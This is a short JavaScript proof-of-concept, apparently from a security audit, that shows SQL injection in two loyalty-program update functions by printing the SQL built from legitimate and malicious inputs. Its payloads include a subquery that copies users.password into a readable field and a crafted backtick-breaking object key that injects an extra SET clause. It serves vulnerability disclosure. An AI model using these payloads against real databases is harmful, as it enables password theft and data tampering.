// PoC for C4 -- SQL injection in server/db.ts: updateLoyaltySettings() and updateLoyaltyPartner()
console.log("=".repeat(80));
console.log("C4 PoC #1 -- updateLoyaltySettings (server/db.ts line 795-803)");
console.log("=".repeat(80));

function buildLoyaltySettingsSQL(data) {
  const sets = Object.entries(data)
    .filter(([_, v]) => v !== undefined)
    .map(([k, v]) => `${k} = ${typeof v === "boolean" ? (v ? 1 : 0) : v}`)
    .join(", ");
  return `UPDATE loyalty_settings SET ${sets} WHERE id = 1`;
}

const legitInput = { pointsPerReferral: 100, isActive: true };
console.log("\nLegitimate input:", JSON.stringify(legitInput));
console.log("Generated SQL:  ", buildLoyaltySettingsSQL(legitInput));

const exfilInput = { pointsPerReferral: "(SELECT password FROM users LIMIT 1)" };
console.log("\nMalicious input:", JSON.stringify(exfilInput));
console.log("Generated SQL:  ", buildLoyaltySettingsSQL(exfilInput));
console.log("\n>> Single valid UPDATE with an embedded subquery -- copies users.password into");
console.log(">> loyalty_settings.pointsPerReferral, readable back via getLoyaltySettings().");

console.log("\n" + "=".repeat(80));
console.log("C4 PoC #2 -- updateLoyaltyPartner (server/db.ts line 852-860)");
console.log("=".repeat(80));

function buildLoyaltyPartnerSQL(id, data) {
  const fields = Object.entries(data).filter(([_, v]) => v !== undefined);
  const setClause = fields
    .map(([k, v]) => `\`${k}\` = ${v === null ? "NULL" : typeof v === "string" ? `'${v.replace(/'/g, "''")}'` : v}`)
    .join(", ");
  return `UPDATE loyalty_partners SET ${setClause} WHERE id = ${id}`;
}

const legitPartner = { name: "Acme Toys", discountPercentage: 15 };
console.log("\nLegitimate input:", JSON.stringify(legitPartner));
console.log("Generated SQL:  ", buildLoyaltyPartnerSQL(1, legitPartner));

const maliciousKeyPayload = {
  "name`, discountPercentage = (SELECT 99999 FROM organizations LIMIT 1) -- ": "x",
};
console.log("\nMalicious input (attacker-controlled KEY):", JSON.stringify(maliciousKeyPayload));
console.log("Generated SQL:  ", buildLoyaltyPartnerSQL(1, maliciousKeyPayload));
console.log("\n>> Backtick quoting around the column name is not escaped against a key that");
console.log(">> itself contains a backtick -- the crafted key breaks out and injects an");
console.log(">> arbitrary extra SET clause plus a trailing comment.");

console.log("\n" + "=".repeat(80));
console.log("Conclusion: both are genuine SQL injection (CWE-89), independent of MySQL's");
console.log("multipleStatements setting -- a single embedded subquery is sufficient.");
